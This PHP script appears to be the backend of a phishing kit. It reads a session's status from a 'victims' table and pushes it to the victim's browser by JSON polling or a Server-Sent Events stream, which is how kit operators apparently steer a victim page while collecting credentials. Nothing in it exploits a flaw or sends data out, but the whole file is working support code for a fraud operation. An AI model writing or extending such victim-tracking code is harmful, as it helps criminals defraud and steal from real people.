<?php
include 'zynexroot/inc/config.php';
include 'zynexroot/inc/connect.php';
session_start();

// Ensure output buffering is off for SSE
if (ob_get_level()) {
    ob_end_clean();
}

header('Content-Type: application/json');

if (isset($_GET['type'])) {
    $uniqueid = $_SESSION['uniqueid'] ?? '';

    if ($_GET['type'] == 'getstatus') {
        // Polling mechanism
        try {
            // Use prepared statements to prevent SQL injection
            $stmt = $conn->prepare("SELECT status FROM victims WHERE uniqueid = ?");
            $stmt->bind_param("s", $uniqueid);
            $stmt->execute();
            $result = $stmt->get_result();

            if ($result->num_rows >= 1) {
                $row = $result->fetch_assoc();
                echo json_encode(['status' => $row['status']]);
            } else {
                echo json_encode(['status' => '']);
            }
        } catch (Exception $e) {
            http_response_code(500); // Internal Server Error
            echo json_encode(['error' => 'Database error']);
            error_log("Polling error for uniqueid $uniqueid at " . date('Y-m-d H:i:s') . ": " . $e->getMessage());
        }
    } elseif ($_GET['type'] == 'sse') {
        // SSE mechanism
        header('Content-Type: text/event-stream');
        header('Cache-Control: no-cache');
        header('Connection: keep-alive');

        // Set a maximum execution time for the SSE stream
        set_time_limit(60); // 60 seconds

        $lastStatus = null;

        while (connection_status() === CONNECTION_NORMAL && !connection_aborted()) {
            try {
                // Use prepared statements to prevent SQL injection
                $stmt = $conn->prepare("SELECT status FROM victims WHERE uniqueid = ?");
                $stmt->bind_param("s", $uniqueid);
                $stmt->execute();
                $result = $stmt->get_result();

                if ($result->num_rows >= 1) {
                    $row = $result->fetch_assoc();
                    $status = $row['status'];

                    if ($status !== $lastStatus) {
                        echo "data: " . json_encode(['status' => $status]) . "\n\n";
                        flush(); // Send data to client
                        ob_flush(); // Ensure output buffer is flushed
                        $lastStatus = $status;
                    }
                }

                // Send a heartbeat message every 10 seconds to keep the connection alive
                sleep(10);
                echo "data: heartbeat\n\n";
                flush();
                ob_flush();
            } catch (Exception $e) {
                http_response_code(500); // Internal Server Error
                echo "data: {" . json_encode(['error' => 'Database error']) . "}\n\n";
                error_log("SSE error for uniqueid $uniqueid at " . date('Y-m-d H:i:s') . ": " . $e->getMessage());
                break; // Exit the loop on error
            }
        }

        // Close the database connection
        $conn->close();
        exit; // Gracefully close the connection
    }
}
?>